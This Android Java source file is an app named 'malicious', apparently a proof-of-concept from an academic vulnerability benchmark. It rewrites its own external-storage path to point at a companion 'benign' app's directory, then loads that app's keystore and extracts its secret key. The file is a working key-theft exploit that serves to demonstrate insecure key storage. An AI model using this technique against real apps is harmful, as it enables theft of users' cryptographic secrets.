package edu.ksu.cs.malicious;

import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableEntryException;
import java.security.cert.CertificateException;

import javax.crypto.SecretKey;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    public static int REQ_CODE = 101;
    static final String ALIAS = "SECRET_KEY";
    static SecretKey secretKey = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, REQ_CODE);
        } else {
            readFromKeyStore();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "Permission granted.");
                readFromKeyStore();
            } else {
                throw new RuntimeException("Permission denied.");
            }
        } else {
            Log.d(TAG, "Not the expected request result.");
        }
    }

    void readFromKeyStore() {
        TextView result = (TextView) findViewById(R.id.resultText);
        File file = new File(getExternalFilesDir(null), "secretKeyStore");
        String absPath = file.getAbsolutePath();
        String modifiedPath = absPath.replace("edu.ksu.cs.malicious", "edu.ksu.cs.benign");
        Log.d(TAG, "Absolute Path = " + absPath);
        Log.d(TAG, "Modified Path = " + modifiedPath);

        KeyStore keyStore = null;
        try {
            keyStore = java.security.KeyStore.getInstance(KeyStore.getDefaultType());
            FileInputStream fis = new FileInputStream(new File(modifiedPath));
            keyStore.load(fis, null);
            KeyStore.SecretKeyEntry secretKeyEntry = (KeyStore.SecretKeyEntry) keyStore.getEntry(ALIAS, null);
            secretKey = secretKeyEntry.getSecretKey();
            result.setText("Successfully retrieved the key.");
            Log.d(TAG, "Successfully retrieved the key.");
        } catch (UnrecoverableEntryException e) {
            e.printStackTrace();
            result.setText("Failed to retrieve the key.");
            Log.d(TAG, "Failed to retrieve the key.");
        } catch (KeyStoreException | CertificateException | NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }
}
